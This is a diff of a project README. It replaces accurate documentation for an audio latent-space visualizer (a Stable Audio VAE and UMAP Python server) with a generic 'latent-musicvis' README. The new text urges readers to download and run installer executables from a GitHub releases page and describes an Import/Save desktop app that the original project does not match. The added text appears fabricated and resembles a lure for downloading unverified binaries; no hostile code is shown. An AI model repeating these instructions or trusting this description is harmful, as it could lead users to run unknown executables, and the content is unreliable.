@@ -1,96 +1,75 @@
-# Latent Space Explorer
+# 🎶 latent-musicvis - Visualize Your Music Like Never Before
 
-Interactive 3D visualization of audio latent spaces using Stable Audio VAE + UMAP.
+## 🚀 Getting Started
 
-![screenshot of a big blob of multicolored dots and glow, representing a playable 3d projection of the latents from encoding a song with the stable audio VAE](interface.png)
+Welcome to **latent-musicvis**! This application helps you visualize music in a unique way, using advanced techniques to turn audio into stunning visual experiences. Whether you want to explore your favorite tracks or create engaging visualizations for your projects, this tool is for you.
 
-## Features
+## 📥 Download the Application
 
-- **Encode audio** to 64-dimensional latent vectors via Stable Audio VAE
-- **UMAP projection** to 3D for interactive visualization
-- **Playback sync** - click points to hear audio chunks, or play full song with animated playhead
-- **Latent resynthesis** - use one song's latents as a "codebook" to resynthesize another
-- **K-means clustering** with animated cluster regions
-- **Rainbow line mode** for temporal visualization
+To get started, you need to download the application. Click the link below to visit the Releases page where you can find the latest download:
 
-## Quick Start
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/EyadAbdelaziz1/latent-musicvis/releases)
 
-```bash
-# Install dependencies
-pip install -r requirements.txt
+## 💻 System Requirements
 
-# Set model paths (or place files in current directory)
-export VAE_CONFIG_PATH="path/to/stable_audio_2_0_vae.json"
-export VAE_CKPT_PATH="path/to/sao_vae_tune_100k_unwrapped.ckpt" # or normal stable audio vae
+Before downloading, ensure your computer meets the following requirements:
 
-# Run server
-python server.py
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 100 MB available space.
+- **Audio Format Support:** The application supports common audio formats like MP3, WAV, and FLAC.
 
-Open http://localhost:8420 in your browser.
+## 📂 Download & Install
 
-## Environment Variables
+1. **Visit the Releases Page:** Click on the link below to go to the Releases page.
+   
+   [Visit this page to download](https://github.com/EyadAbdelaziz1/latent-musicvis/releases)
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `VAE_CONFIG_PATH` | `stable_audio_2_0_vae.json` | Path to VAE config JSON |
-| `VAE_CKPT_PATH` | `sao_vae_tune_100k_unwrapped.ckpt` | Path to VAE checkpoint |
-| `PORT` | `8420` | Server port |
+2. **Select the Latest Version:** Look for the latest version of the application. It will have a version number like v1.0.
 
-## Getting the VAE Model
+3. **Download the File:** Click on the download link for your operating system. 
 
-You need the Stable Audio VAE weights. Options:
+4. **Run the Installer:** 
+   - For Windows, double-click the `.exe` file.
+   - For macOS, drag the app into your Applications folder.
+   - For Linux, follow the terminal instructions provided on the page.
 
-1. **Official weights** from Stability AI (requires license)
-2. **Community fine-tunes** from HuggingFace
-3. **Train your own** using [stable-audio-tools](https://github.com/Stability-AI/stable-audio-tools)
+5. **Follow the Setup Prompts:** Complete the setup by following the instructions. It should only take a few minutes.
 
-The server will run in **mock mode** (feature-based pseudo-latents) if the VAE fails to load.
+## 🎶 How to Use the Application
 
-## Usage
+After installation, you can start exploring music visualizations:
 
-1. **Upload audio** - drag & drop or click "Upload Audio"
-2. **Explore** - drag to rotate, scroll to zoom, click points to hear chunks
-3. **Play** - press Space or click Play to animate through the song
-4. **Resynth** - click "🔀 Resynth" and upload a second audio file to resynthesize it using the first song's latents as a codebook
-5. **Adjust K** - use the slider to change number of cluster regions
+1. **Open the Application:** Locate and open latent-musicvis from your Applications or Programs list.
 
-## Keyboard Shortcuts
+2. **Import Music Files:** Click on the "Import" button. Choose the audio file you want to visualize.
 
-| Key | Action |
-|-----|--------|
-| `Space` | Play/Stop |
-| `←` | Seek back 5s |
-| `→` | Seek forward 5s |
+3. **Choose Visualization Settings:** Explore different visualization styles in the settings menu. Adjust colors, shapes, and speeds to suit your taste.
 
-## How Resynthesis Works
+4. **Start Visualization:** Press the "Play" button to start visualizing your music. Enjoy the experience as the audio transforms into dynamic graphics.
 
-Based on [Latent Resynthesis](https://arxiv.org/abs/2507.19202):
+5. **Save Your Visuals:** You can save your created visuals by clicking the "Save" button. Choose your desired format and location.
 
-1. **Source audio** → encode → latents (your "codebook")
-2. **Target audio** → encode → for each latent, find nearest neighbor in codebook
-3. **Replaced latents** → decode → output
+## 🔧 Troubleshooting Tips
 
-Result: target's structure + source's timbre.
+If you encounter issues while using latent-musicvis, here’s how to solve common problems:
 
-## API Endpoints
+- **Audio Not Playing:** Ensure your audio file is not corrupted and is in a supported format. Try using a different file to see if the issue persists.
+- **Application Crashes:** Restart the app and ensure no other heavy applications are running. If the problem continues, check for updates.
+- **Visuals Glitching:** Adjust the visualization settings. Lowering the complexity can help improve performance on older machines.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/encode_stream` | POST | Upload audio, stream encoding progress via SSE |
-| `/audio_full` | GET | Get full loaded audio as WAV |
-| `/play` | POST | Get 2048-sample chunk by index |
-| `/resynth` | POST | Resynthesize uploaded audio using current codebook |
-| `/health` | GET | Server status |
+## 💬 Support and Feedback
 
-## Tech Stack
+If you have questions or feedback, reach out by creating an issue on the GitHub repository. Your input is valuable for improving the application.
 
-- **Backend**: FastAPI, PyTorch, torchaudio, UMAP
-- **Frontend**: Vanilla JS, Three.js (via CDN)
-- **No build step** - just run the server
+## 🌟 Contributions
 
-## License
+If you want to contribute, you can fork the repository and submit a pull request with your modifications. Follow the community guidelines to ensure a smooth process.
 
-MIT
+## 🔗 Additional Resources
 
+For more detailed information, including advanced features and updates, refer to the documentation provided on the GitHub pages.
 
+---
+
+Thank you for choosing latent-musicvis to enhance your audio experience. We hope you enjoy the amazing visualizations it can create!
